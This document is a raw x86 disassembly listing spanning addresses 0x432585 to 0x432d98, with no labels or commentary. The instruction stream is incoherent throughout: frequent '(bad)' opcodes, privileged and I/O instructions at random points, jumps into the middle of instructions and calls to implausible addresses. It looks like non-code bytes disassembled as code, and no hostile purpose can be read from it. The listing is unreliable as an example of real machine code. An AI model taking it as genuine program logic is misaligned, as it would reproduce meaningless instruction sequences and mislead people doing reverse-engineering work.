  432585:	fdivr  QWORD PTR [esi+0x668a5d]
  43258b:	cmp    al,0x33
  43258d:	mov    si,0x4e7d
  432591:	mov    eax,DWORD PTR [eax]
  432593:	lock inc ebp
  432595:	mov    esi,DWORD PTR [eax]
  432597:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43259e:	clc    
  43259f:	(bad)  
  4325a0:	cmp    edi,DWORD PTR [ebx]
  4325a2:	je     0x4325b3
  4325a4:	push   ebx
  4325a5:	loopne 0x4325b6
  4325a7:	dec    ecx
  4325a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4325ac:	int    0xf1
  4325ae:	mov    esi,0x703084d
  4325b3:	pcmpgtd mm6,mm1
  4325b6:	add    BYTE PTR [ebp+0x66],dh
  4325b9:	jmp    0x432586
  4325bb:	mov    eax,DWORD PTR [ebx]
  4325bd:	lock push ebp
  4325bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4325c5:	or     bh,dl
  4325c7:	jb     0x4325c7
  4325c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4325cf:	loopne 0x4325d1
  4325d1:	jne    0x4325d5
  4325d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4325d7:	mov    ecx,ebx
  4325d9:	data16 cmp al,0xf1
  4325dc:	add    BYTE PTR [esi+eiz*2],bh
  4325df:	add    bl,cl
  4325e1:	retw   0xf2
  4325e5:	ret    0x66
  4325e8:	retf   
  4325e9:	enterw 0x4df1,0x19
  4325ee:	pop    edi
  4325ef:	jne    0x432572
  4325f1:	mov    esi,DWORD PTR [eax]
  4325f3:	call   0x77b7b194
  4325f8:	xor    ebp,DWORD PTR [ebx]
  4325fa:	lea    esp,[esi+0x48]
  4325fd:	repnz in eax,0x3b
  432600:	add    BYTE PTR [ebp-0x37],dh
  432603:	xor    edx,DWORD PTR [ebp-0x15]
  432606:	in     al,dx
  432607:	xor    edx,DWORD PTR [esi+0x40]
  43260a:	mov    DWORD PTR [edi],0x338545fc
  432610:	clc    
  432611:	add    esi,DWORD PTR [ecx]
  432613:	pop    edi
  432614:	pushf  
  432615:	pop    ebx
  432616:	call   0xff4425dd
  43261b:	mov    edi,eax
  43261d:	push   ecx
  43261e:	pop    es
  43261f:	mov    edi,DWORD PTR [eax]
  432621:	push   esi
  432622:	inc    esi
  432623:	add    bh,BYTE PTR [esi+0x0]
  432626:	popa   
  432627:	data16 (bad) 
  432629:	into   
  43262a:	gs cmp al,0xcd
  43262d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432633:	ret    0x66
  432636:	add    bh,al
  432638:	add    bh,ah
  43263a:	add    BYTE PTR [ebp+0x31c3f866],al
  432640:	cmp    al,0x9c
  432642:	add    BYTE PTR [esi+0x66],ah
  432645:	into   
  432646:	ret    
  432647:	pop    ebp
  432648:	adc    BYTE PTR [edi+0x0],dl
  43264b:	mov    bh,0x66
  43264d:	mov    edi,0xff038dc3
  432652:	jne    0x4326a8
  432654:	lea    edx,[ecx+0x1]
  432657:	mov    ebx,0xd64ff1
  43265c:	sar    DWORD PTR [ebx],1
  43265e:	test   BYTE PTR [ebp+0x36],dh
  432661:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432665:	push   edi
  432666:	xor    BYTE PTR [ebx],0x38
  432669:	mov    esi,ebx
  43266b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432671:	ss inc ebp
  432673:	fs pop ebx
  432675:	mov    ebx,0x9c3b30
  43267a:	je     0x4326a7
  43267c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432682:	mov    WORD PTR [ebx],?
  432684:	ss mov ebx,0x8b4e64
  43268a:	pop    edi
  43268b:	cmp    ecx,ecx
  43268d:	jne    0x4326e4
  43268f:	mov    ebp,esp
  432691:	cld    
  432692:	push   esi
  432693:	pop    ebx
  432694:	inc    ebp
  432695:	stc    
  432696:	xor    BYTE PTR [ebp+0x9bef89c],al
  43269c:	test   esi,ecx
  43269e:	clc    
  43269f:	test   dl,dl
  4326a1:	cmp    bh,bh
  4326a3:	fs pop si
  4326a6:	or     bl,al
  4326a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4326ae:	retf   0x3c45
  4326b1:	xor    BYTE PTR [eax],al
  4326b3:	pushf  
  4326b4:	mov    si,0x85ca
  4326b8:	ret    0xf8
  4326bb:	pop    ebx
  4326bc:	dec    dx
  4326bf:	mov    edx,DWORD PTR [edi-0x76]
  4326c2:	push   edi
  4326c3:	add    al,0xb7
  4326c5:	xor    al,0xba
  4326c7:	cmp    al,0x8d
  4326c9:	je     0x4326ca
  4326cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4326cf:	lea    edi,[ebx+0x544fff]
  4326d5:	push   ecx
  4326d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4326d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4326df:	add    BYTE PTR [ebx],dh
  4326e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4326e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4326ee:	mov    ebx,0x3b3b00
  4326f3:	jne    0x432720
  4326f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4326fb:	xor    esi,DWORD PTR [ebx]
  4326fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432703:	push   edi
  432704:	cmp    esp,ebp
  432706:	jne    0x432708
  432708:	sbb    DWORD PTR [eax],0x8085c3fc
  43270e:	clc    
  43270f:	inc    esi
  432710:	pop    ebx
  432711:	sti    
  432712:	add    eax,0xeb8bc075
  432717:	cld    
  432718:	xor    edi,DWORD PTR ds:0xf8c3855e
  43271e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432721:	rol    DWORD PTR [ebp-0x37],0xf
  432725:	mov    DWORD PTR [eax],ecx
  432727:	inc    edi
  432728:	(bad)  
  432729:	in     eax,0xfe
  43272b:	add    bh,bh
  43272d:	(bad)  
  43272e:	mov    esi,0xc38a5e
  432733:	mov    esi,DWORD PTR [ebx]
  432735:	push   ecx
  432736:	mov    edi,0xfc4ec7
  43273b:	test   DWORD PTR [ebp-0x8],edx
  43273e:	xor    di,ax
  432741:	pushf  
  432742:	sub    ebp,eax
  432744:	inc    ebp
  432745:	(bad)  
  432746:	sub    edi,edi
  432748:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43274e:	inc    ebp
  43274f:	add    BYTE PTR [esi+0x2b],ah
  432752:	or     bh,BYTE PTR [edx+0xf8ac2]
  432758:	cmp    al,0x33
  43275a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432760:	(bad)  
  432761:	cmp    esi,DWORD PTR [ebx]
  432763:	je     0x43271d
  432765:	push   ebx
  432766:	dec    esi
  432767:	str    ecx
  43276a:	cmp    esp,DWORD PTR [ebp+0x75]
  43276d:	int    0x33
  43276f:	mov    edi,0x789085f
  432774:	mov    edx,DWORD PTR [eax]
  432776:	cld    
  432777:	add    cl,cl
  432779:	data16 add al,0xcb
  43277c:	push   ebp
  43277d:	add    ebp,esp
  43277f:	jne    0x43276d
  432781:	(bad)  
  432782:	mov    DWORD PTR [ecx],0xd685f7ec
  432788:	clc    
  432789:	xlat   BYTE PTR ds:[ebx]
  43278a:	inc    ebp
  43278b:	mov    esi,DWORD PTR [edx]
  43278d:	push   eax
  43278e:	pushf  
  43278f:	in     eax,0x8b
  432791:	add    ah,ch
  432793:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432797:	add    ax,0x72cb
  43279b:	cmp    al,0x0
  43279d:	add    BYTE PTR [ebp+0x66],al
  4327a0:	(bad)  
  4327a1:	retf   
  4327a2:	lock ret 0x85
  4327a6:	clc    
  4327a7:	inc    bp
  4327a9:	retf   
  4327aa:	cmp    eax,0xc77d9cc8
  4327af:	xor    ah,bh
  4327b1:	pushf  
  4327b2:	test   DWORD PTR [edi-0x8],ebx
  4327b5:	je     0x4327fc
  4327b7:	xor    esi,DWORD PTR ds:0x7020840
  4327bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4327c1:	push   ebp
  4327c2:	add    esp,ebp
  4327c4:	jb     0x432751
  4327c6:	add    BYTE PTR [eax],cl
  4327c8:	dec    ebp
  4327c9:	mov    bh,0x81
  4327cb:	push   esi
  4327cc:	push   esp
  4327cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4327d4:	xor    al,BYTE PTR [eax]
  4327d6:	mov    edx,DWORD PTR [edi+0x10]
  4327d9:	(bad)  
  4327da:	scas   eax,DWORD PTR es:[edi]
  4327db:	ret    0x3b
  4327de:	jns    0x3b4424d1
  4327e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4327e8:	dec    ebp
  4327e9:	or     BYTE PTR [ebx],ch
  4327eb:	ret    0x458b
  4327ee:	lock jmp 0x4327e2
  4327f1:	mov    ecx,DWORD PTR [eax]
  4327f3:	or     BYTE PTR [edi],al
  4327f5:	mov    ecx,eax
  4327f7:	xor    DWORD PTR [edx+0x2],0x0
  4327fb:	mov    bh,0xc1
  4327fd:	adc    BYTE PTR [eax],dh
  4327ff:	iret   
  432800:	inc    ebp
  432801:	mov    DWORD PTR [ebx],0x4dfff8c4
  432807:	inc    BYTE PTR [ebx]
  432809:	ret    0xf8
  43280c:	adc    DWORD PTR [esi+0x10],esp
  43280f:	clc    
  432810:	dec    ecx
  432811:	fisttp WORD PTR [ecx+0x456604c0]
  432817:	add    dh,BYTE PTR ds:0x75e0845
  43281d:	ret    0x4d
  432820:	lea    ecx,[ebx+0x18728301]
  432826:	add    BYTE PTR [ebp+0x45],al
  432829:	xor    ecx,ebp
  43282b:	pushf  
  43282c:	add    bh,al
  43282e:	add    al,ch
  432830:	inc    ebp
  432831:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432837:	xor    eax,0x781084d
  43283c:	push   esp
  43283d:	fwait
  43283e:	push   ecx
  43283f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432845:	inc    ebp
  432846:	cmp    edi,DWORD PTR [ecx]
  432848:	jbe    0x4327e6
  43284a:	mov    eax,edi
  43284c:	or     ah,dh
  43284e:	inc    ebp
  43284f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432855:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43285b:	in     al,dx
  43285c:	hlt    
  43285d:	push   esp
  43285e:	push   esp
  43285f:	push   ecx
  432860:	push   ecx
  432861:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432867:	fwait
  432868:	fwait
  432869:	xor    dh,BYTE PTR [edx]
  43286b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432871:	or     BYTE PTR [ebp+0x7],al
  432874:	mov    eax,ecx
  432876:	clc    
  432877:	jb     0x43283a
  432879:	add    BYTE PTR [ebp+0x55],cl
  43287c:	or     DWORD PTR [edi],0xc251d154
  432882:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43288c:	mov    edi,eax
  43288e:	or     cl,al
  432890:	inc    ebp
  432891:	dec    ebp
  432892:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432898:	or     WORD PTR [ecx],0x899b
  43289d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4328a3:	mov    edx,DWORD PTR [ecx+0x8]
  4328a6:	mov    eax,DWORD PTR [ebp-0x8]
  4328a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4328b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328b6:	inc    ebp
  4328b7:	dec    eax
  4328b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4328be:	add    edx,DWORD PTR [ecx-0x8]
  4328c1:	mov    ecx,DWORD PTR [ecx]
  4328c3:	clc    
  4328c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4328cb:	mov    ecx,ebp
  4328cd:	clc    
  4328ce:	(bad)  
  4328cf:	popf   
  4328d0:	inc    DWORD PTR [eax]
  4328d2:	ret    0x8b
  4328d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4328db:	mov    edi,esp
  4328dd:	hlt    
  4328de:	test   ecx,esi
  4328e0:	clc    
  4328e1:	or     BYTE PTR [ebp+0x7],al
  4328e4:	xor    al,cl
  4328e6:	pushf  
  4328e7:	jb     0x43291c
  4328e9:	add    BYTE PTR [eax-0x3f],al
  4328ec:	inc    eax
  4328ed:	daa    
  4328ee:	inc    ebp
  4328ef:	inc    ebp
  4328f0:	xor    eax,0x7f80803
  4328f5:	dec    ebp
  4328f6:	fwait
  4328f7:	add    esi,DWORD PTR [edx]
  4328f9:	clc    
  4328fa:	cmp    DWORD PTR [ecx],ecx
  4328fc:	or     al,0x8
  4328fe:	add    al,BYTE PTR [ebp+0x2c]
  432901:	xor    eax,0x7350845
  432906:	or     BYTE PTR [ebp+0x7],cl
  432909:	lea    ebx,[ebx-0x748dcdff]
  43290f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432916:	mov    edx,DWORD PTR [eax]
  432918:	cld    
  432919:	dec    ebp
  43291a:	push   esp
  43291b:	sub    edx,DWORD PTR [ecx-0x75]
  43291e:	add    eax,0xf172fc
  432923:	or     BYTE PTR [ebp+0x7],cl
  432926:	add    eax,ecx
  432928:	or     al,0x72
  43292a:	add    DWORD PTR [eax],eax
  43292c:	mov    ebx,0x29c2c1
  432931:	inc    ebp
  432932:	mov    eax,DWORD PTR [ebx]
  432934:	cmp    eax,0x3004d1c
  43293a:	xbegin 0x66c8b534
  432940:	clc    
  432941:	or     BYTE PTR [ebp+0x45],al
  432944:	xor    dh,BYTE PTR ds:0x78b089c
  43294a:	adc    BYTE PTR [ebp+0x45],cl
  43294d:	lea    eax,[ebp+0x33727501]
  432953:	add    cl,ch
  432955:	inc    ebp
  432956:	add    bl,ch
  432958:	add    BYTE PTR [ebx+0x45850845],cl
  43295e:	je     0x4328eb
  432960:	push   ebx
  432961:	or     al,0x85
  432963:	dec    ebp
  432964:	std    
  432965:	mov    bh,bh
  432967:	mov    BYTE PTR [ebp-0x75],al
  43296a:	mov    edi,eax
  43296c:	or     al,0x89
  43296e:	inc    ebp
  43296f:	clc    
  432970:	mov    esp,esp
  432972:	hlt    
  432973:	call   DWORD PTR [edi-0x37]
  432976:	push   esp
  432977:	or     al,0x51
  432979:	push   ebp
  43297a:	xor    ebp,esp
  43297c:	mov    esi,0x457251
  432981:	xor    esi,eax
  432983:	pushf  
  432984:	inc    ebp
  432985:	(bad)  
  432986:	mov    edi,eax
  432988:	or     al,0x85
  43298a:	add    al,bh
  43298c:	inc    eax
  43298e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432992:	or     ah,bh
  432994:	inc    eax
  432995:	push   esp
  432996:	jmp    0x4329e9
  432998:	mov    eax,DWORD PTR ds:0xe8720c
  43299e:	mov    DWORD PTR [ebp-0x8],eax
  4329a1:	jne    0x4329e8
  4329a3:	jmp    0x432930
  4329a5:	mov    ebp,DWORD PTR [eax]
  4329a7:	clc    
  4329a8:	retf   0xff54
  4329ab:	push   ecx
  4329ac:	mov    DWORD PTR ds:0x757210,eax
  4329b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4329b5:	sub    esp,DWORD PTR [ebx-0x77]
  4329b8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4329bf:	or     ah,bh
  4329c1:	pop    es
  4329c2:	ds fwait
  4329c4:	push   DWORD PTR [edx]
  4329c6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4329cc:	(bad)  
  4329cd:	mov    bh,bh
  4329cf:	jmp    0x4329bd
  4329d1:	leave  
  4329d2:	jne    0x4329dc
  4329d4:	call   0x30232e
  4329d9:	in     al,dx
  4329da:	dec    ebp
  4329db:	add    dh,BYTE PTR [ebx]
  4329dd:	add    BYTE PTR [ebx],al
  4329df:	inc    ebp
  4329e0:	cmp    esi,DWORD PTR [ecx]
  4329e2:	je     0x432980
  4329e4:	mov    eax,edi
  4329e6:	or     al,0xf0
  4329e8:	add    BYTE PTR [ebp+0x458bf845],al
  4329ee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4329f4:	adc    al,0x7
  4329f6:	enter  0x9fc0,0xa5
  4329fa:	rol    BYTE PTR [eax],0x5e
  4329fd:	mov    ecx,ecx
  4329ff:	or     al,0xc
  432a01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a08:	jmp    0x432a09
  432a0a:	push   ebp
  432a0b:	mov    esp,ebp
  432a0d:	cld    
  432a0e:	inc    ebp
  432a0f:	inc    ebp
  432a10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a17:	push   esi
  432a18:	push   esi
  432a19:	mov    edi,0x7af080f
  432a1e:	add    bh,al
  432a20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432a26:	add    BYTE PTR [ecx+0x4540100f],cl
  432a2c:	mov    ebp,eax
  432a2e:	mov    ebp,edi
  432a30:	lock call edx
  432a33:	fcom   DWORD PTR [ebp+0x45]
  432a36:	mov    eax,0x148a8b
  432a3b:	push   ecx
  432a3c:	enter  0xc145,0x83
  432a40:	cmp    ecx,DWORD PTR [eax]
  432a42:	add    BYTE PTR [ebp+0x4d],al
  432a45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a4b:	call   0xffa325ba
  432a50:	cmp    eax,DWORD PTR [ebp-0xc]
  432a53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a57:	push   ebp
  432a58:	(bad)  
  432a59:	call   0x34285d
  432a5e:	mov    bh,0xdb
  432a60:	cld    
  432a61:	or     BYTE PTR [ebp+0x45],bl
  432a64:	(bad)  
  432a65:	call   0xff7d26f5
  432a6a:	add    al,BYTE PTR [ebp+0x37]
  432a6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432a73:	jne    0x432a75
  432a75:	(bad)  
  432a76:	cmp    edi,esp
  432a78:	jne    0x432aab
  432a7a:	mov    edi,edi
  432a7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432a82:	pop    ds
  432a83:	into   
  432a84:	je     0x432a47
  432a86:	mov    ebx,DWORD PTR [esi]
  432a88:	or     BYTE PTR [ebp-0x49],al
  432a8b:	mov    esp,DWORD PTR [esi-0x77]
  432a8e:	mov    esi,0x2451f0c
  432a93:	mov    eax,DWORD PTR [eax]
  432a95:	or     al,0x66
  432a97:	sar    bl,0x3b
  432a9a:	xor    esi,DWORD PTR [ebp+0x66]
  432a9d:	xor    ecx,edi
  432a9f:	pop    edi
  432aa0:	adc    bl,BYTE PTR [ebx+0x7e]
  432aa3:	ret    0xff
  432aa6:	cld    
  432aa7:	inc    ebp
  432aa8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432aae:	cld    
  432aaf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432ab6:	push   0xffffff83
  432ab8:	pop    edi
  432ab9:	or     BYTE PTR [ebp+0x53],dh
  432abc:	xorps  xmm1,xmm2
  432abf:	test   BYTE PTR [eax+eax*1],bh
  432ac2:	add    BYTE PTR [eax],al
  432ac4:	adc    eax,eax
  432ac6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432ace:	jmp    DWORD PTR [eax]
  432ad0:	ror    al,0x5e
  432ad3:	inc    ebp
  432ad4:	leave  
  432ad5:	xor    ecx,DWORD PTR [eax]
  432ad7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432add:	add    ah,al
  432adf:	xor    edi,edi
  432ae1:	xor    DWORD PTR [ebx],0x66003302
  432ae7:	mov    DWORD PTR [ebp-0xc],ecx
  432aea:	pcmpgtw mm0,mm0
  432aed:	add    dl,ah
  432aef:	leave  
  432af0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432af4:	push   eax
  432af5:	dec    ebp
  432af6:	mov    esi,DWORD PTR [ebx-0x75]
  432af9:	lea    ebp,[eax-0x7c00ff02]
  432aff:	xor    eax,DWORD PTR [eax]
  432b01:	sysret 
  432b03:	dec    ebp
  432b04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b0b:	push   WORD PTR [ecx+0x8]
  432b0f:	jne    0x432ad2
  432b11:	ud0    ecx,DWORD PTR [ecx]
  432b14:	mov    eax,edx
  432b16:	lods   al,BYTE PTR ds:[esi]
  432b17:	add    BYTE PTR [eax],al
  432b19:	data16 (bad) 
  432b1b:	iret   
  432b1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b23:	cli    
  432b24:	inc    ebp
  432b25:	cmp    al,0x8d
  432b27:	add    BYTE PTR [esi+0x2d],ah
  432b2a:	inc    ebp
  432b2b:	pop    ebp
  432b2c:	lea    ecx,[edi]
  432b2e:	mov    dl,bh
  432b30:	add    BYTE PTR [edi],cl
  432b32:	mov    DWORD PTR [eax+eax*8],edi
  432b35:	mov    ebx,0x3b87
  432b3a:	add    BYTE PTR [ebx],ch
  432b3c:	inc    ebp
  432b3d:	data16 (bad) 
  432b3f:	clc    
  432b40:	int3   
  432b41:	cmp    eax,DWORD PTR [eax]
  432b43:	je     0x432ace
  432b45:	push   0xffffffc8
  432b47:	pop    edi
  432b48:	xchg   DWORD PTR [ebp+0x0],eax
  432b4b:	data16 add BYTE PTR [ebp+0x45],cl
  432b4f:	lea    cx,[ebp+0x10]
  432b53:	jb     0x432b55
  432b55:	jmp    0x432ae0
  432b57:	call   eax
  432b59:	clc    
  432b5a:	xchg   DWORD PTR [edi+0x1],edi
  432b5d:	mov    eax,DWORD PTR [eax]
  432b5f:	or     BYTE PTR [ebp-0x49],al
  432b62:	lea    eax,[eax+0x74003154]
  432b68:	push   edi
  432b69:	inc    edx
  432b6a:	jge    0x432b6b
  432b6c:	mov    DWORD PTR [edi],ecx
  432b6e:	fdiv   DWORD PTR [edi-0x6]
  432b71:	inc    DWORD PTR [eax]
  432b73:	xor    edx,DWORD PTR [eax+0x5f]
  432b76:	xchg   DWORD PTR [ebx+0x1],ebx
  432b79:	ret    0x0
  432b7c:	xor    BYTE PTR [ebp-0x51],cl
  432b7f:	cmp    edi,0xf0ff89fe
  432b85:	data16 ror al,0x84
  432b89:	rol    BYTE PTR [eax],0x3b
  432b8c:	add    al,dh
  432b8e:	dec    eax
  432b8f:	xchg   esp,eax
  432b90:	push   ebx
  432b91:	jmp    0x432b1e
  432b93:	push   ebp
  432b94:	add    esp,ebp
  432b96:	add    ebp,esp
  432b98:	mov    edx,DWORD PTR [edi+0x24]
  432b9b:	clc    
  432b9c:	dec    esi
  432b9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ba3:	cmp    BYTE PTR [ebx],al
  432ba5:	jne    0x432b30
  432ba7:	xor    esp,eax
  432ba9:	jmp    0x462d2c
  432bae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bb1:	jne    0x432ba7
  432bb3:	call   0xffcd290d
  432bb8:	clc    
  432bb9:	xchg   edi,eax
  432bba:	sti    
  432bbb:	add    DWORD PTR [ebx],eax
  432bbd:	add    BYTE PTR [ebp+0x47],bl
  432bc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432bc6:	pop    ebp
  432bc7:	mov    DWORD PTR [esi-0x48],esi
  432bca:	jmp    0x432c13
  432bcc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432bd2:	(bad)  
  432bd4:	cmp    al,0x0
  432bd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432bd9:	lea    ebx,[ebp-0x56]
  432bdc:	jle    0x432bde
  432bde:	jae    0x432b69
  432be0:	mov    eax,esp
  432be2:	call   0xb900:0x8b005587
  432be9:	inc    ebp
  432bea:	push   ebp
  432beb:	lea    ecx,[ebp-0x27ff4f12]
  432bf1:	mov    eax,edi
  432bf3:	int3   
  432bf4:	push   ebp
  432bf5:	xchg   edi,eax
  432bf7:	add    esp,ebp
  432bf9:	add    BYTE PTR [eax],al
  432bfb:	inc    ebp
  432bfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432c02:	cld    
  432c03:	mov    DWORD PTR [edx],edi
  432c05:	aam    0x75
  432c07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c0d:	mov    DWORD PTR [ebx-0x50],edx
  432c10:	test   BYTE PTR [ebp-0x1],0xe8
  432c14:	mov    eax,DWORD PTR [eax]
  432c16:	hlt    
  432c17:	add    al,al
  432c19:	mov    eax,DWORD PTR ds:0x890045a8
  432c1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c25:	inc    DWORD PTR [eax*2+0xf75854d]
  432c2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c32:	call   0x72998973
  432c37:	je     0x432c97
  432c39:	js     0x432c9a
  432c3b:	lock ret 0x7e
  432c3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c45:	mov    edi,edi
  432c47:	sbb    al,bl
  432c49:	clc    
  432c4a:	add    BYTE PTR [ebp-0x73],bh
  432c4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c53:	ror    BYTE PTR [eax],1
  432c55:	dec    ebp
  432c56:	xchg   ebp,eax
  432c57:	mov    edi,edi
  432c59:	in     al,0x8b
  432c5b:	jge    0x432be6
  432c5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432c63:	clc    
  432c64:	pop    esi
  432c65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432c6b:	clc    
  432c6c:	add    al,0x6e
  432c6e:	mov    eax,DWORD PTR [ebx]
  432c70:	mov    BYTE PTR [ebp+0x0],dl
  432c73:	mov    edx,DWORD PTR [ebx-0x20]
  432c76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432c7c:	add    eax,0x3b3b73
  432c81:	adc    al,0x89
  432c83:	pop    eax
  432c84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432c88:	ret    0xf08
  432c8b:	cmp    al,0x2
  432c8d:	mov    edx,eax
  432c8f:	cld    
  432c90:	add    BYTE PTR [ebp+0x66],dl
  432c93:	add    eax,ebx
  432c95:	add    esp,eax
  432c97:	sub    eax,eax
  432c99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432c9f:	add    BYTE PTR [eax],al
  432ca1:	mov    DWORD PTR [ebx-0x24],ebx
  432ca4:	push   edi
  432ca5:	push   ebp
  432ca6:	clc    
  432ca7:	add    DWORD PTR [esi+0x1b0100],0x45
  432cae:	out    0xff,eax
  432cb0:	add    edx,DWORD PTR [eax]
  432cb2:	jmp    0x432c9c
  432cb4:	cmp    ch,0x46
  432cb7:	(bad)  
  432cb8:	jmp    0x40c8b50a
  432cbd:	je     0x432c49
  432cbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432cc5:	inc    ebp
  432cc6:	add    BYTE PTR [ebx-0x770375],al
  432ccc:	add    ah,ch
  432cce:	add    edx,esp
  432cd0:	pop    edi
  432cd1:	pop    ebp
  432cd2:	push   ebp
  432cd3:	inc    ebx
  432cd4:	in     al,dx
  432cd5:	pop    ebp
  432cd6:	in     al,dx
  432cd7:	cmp    edx,DWORD PTR [edi-0x8]
  432cda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432ce1:	add    al,0x47
  432ce3:	push   ebp
  432ce4:	mov    esp,ebp
  432ce6:	in     al,0x45
  432ce8:	dec    ebp
  432ce9:	push   esi
  432cea:	test   DWORD PTR [eax+0xfb010f],esi
  432cf0:	add    BYTE PTR [eax+0xc018b],dh
  432cf6:	leave  
  432cf7:	inc    ebp
  432cf8:	test   al,ch
  432cfa:	add    dh,bh
  432cfc:	add    bh,bh
  432cfe:	dec    ebp
  432cff:	push   cs
  432d00:	mov    DWORD PTR [ecx],eax
  432d02:	hlt    
  432d03:	push   es
  432d04:	dec    ebp
  432d05:	leave  
  432d06:	mov    DWORD PTR [eax],ecx
  432d08:	clc    
  432d09:	cmovge eax,ecx
  432d0c:	mov    ecx,0x85c2f0
  432d12:	clc    
  432d13:	pop    DWORD PTR [ebp+0x1]
  432d16:	push   ebx
  432d17:	add    BYTE PTR [ebp-0x15],bh
  432d1a:	push   esi
  432d1b:	xor    eax,0x898a45
  432d20:	cld    
  432d21:	add    al,BYTE PTR [ebp+0x0]
  432d24:	xor    esp,DWORD PTR [esi-0x64]
  432d27:	add    DWORD PTR [esi+0x78308c1],edi
  432d2d:	add    ah,BYTE PTR [ebp-0x49]
  432d30:	int    0xbb
  432d32:	mov    ecx,DWORD PTR [esi+0xc]
  432d35:	add    dh,al
  432d37:	cmp    ecx,ebx
  432d39:	jne    0x432d03
  432d3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432d3e:	jmp    0xca2d44
  432d43:	add    DWORD PTR [ebp+0x0],eax
  432d46:	mov    eax,ebx
  432d48:	or     al,0x8b
  432d4a:	(bad)  
  432d4b:	mov    ecx,esi
  432d4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432d54:	mov    eax,edi
  432d56:	or     BYTE PTR [edx],cl
  432d58:	shl    cl,cl
  432d5a:	icebp  
  432d5b:	add    BYTE PTR [ebp+0x38],0x8b
  432d5f:	or     BYTE PTR [edx+eax*2],cl
  432d62:	(bad)  
  432d63:	or     cl,dh
  432d65:	stc    
  432d66:	shl    DWORD PTR [ebp-0x30],0xc6
  432d6a:	xor    al,0x0
  432d6c:	inc    ebp
  432d6d:	xchg   BYTE PTR [ebx],al
  432d6f:	add    esp,edi
  432d71:	add    BYTE PTR [ebp-0x39],cl
  432d74:	mov    al,bl
  432d76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432d7c:	sub    al,0xbf
  432d7e:	jmp    0x432d05
  432d80:	mov    edi,eax
  432d82:	lock jge 0x432d76
  432d85:	lea    esi,[edx-0x74bad5ff]
  432d8b:	mov    ebp,esp
  432d8d:	or     cl,dh
  432d8f:	leave  
  432d90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432d97:	dec    ebp
  432d98:	dec    ebp
